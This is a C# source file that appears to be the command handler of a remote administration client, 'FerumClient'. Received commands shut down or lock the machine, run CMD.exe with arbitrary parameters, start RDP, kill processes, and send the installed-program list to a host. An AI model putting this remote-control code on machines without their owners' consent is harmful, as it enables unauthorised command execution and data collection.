using FerumClient.Core.ComputerInformation;
using FerumClient.Core.Helper;
using FerumEntities.RequestInformation;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace FerumClient.Core
{
    public class Commands
    {
        public static void Send(string _command, string _param = "")
        {
            try
            {
                switch (_command)
                {
                    case "Open":
                        Process.Start("calc.exe");
                        break;
                    case "Shutdown":
                        Process.Start("ShutDown", "/s");
                        break;
                    case "Restart":
                        Process.Start("ShutDown", "/r");
                        break;
                    case "Lock":
                        LockWorkStation();
                        break;
                    case "Cmd":
                        Process.Start("CMD.exe", _param);
                        break;
                    case "RDP":
                        GlobalVar.RdpClient = new RDPClient();
                        GlobalVar.RdpClient.ServerStart(null);
                        break;
                    case "RDPDisconnect":
                        GlobalVar.RdpClient.Disconnect();
                        break;
                    case "Disconect":
                        Process.GetCurrentProcess().Kill();
                        break;
                    case "Kill Process":
                        foreach (var process in Process.GetProcessesByName(_param))
                        {
                            process.Kill();
                        }
                        break;
                    case "Get Process":
                        //List<ProcessEntity> listProcess = ComputerInformation.GetAllProcessEntityList();
                        //string jsonString = JsonConvert.SerializeObject(listProcess);
                        //SendHostInfo.SendHost(jsonString);
                        break;
                    case "Get Programs":
                        // получаем список программ
                        List<InstalledProgram> installed = Computer.GetInstalledProgramsFromRegistry();
                        string json = JsonConvert.SerializeObject(installed);

                        // генерируем класс с ответом
                        AnswerEntity answer = new AnswerEntity(GlobalVar.HostName, json, AnswerEntity.TypeAnswers.Programs);
                        string jsonSend = JsonConvert.SerializeObject(answer);

                        // отправляем
                        SendHostInfo.SendHostRequest(json);
                        break;
                }
            }
            catch(Exception ex)
            {
                ErrorLog.ScreenError(ex.Message);
            }
           
        }



        [DllImport("user32.dll")]
        public static extern void LockWorkStation();
    }
}
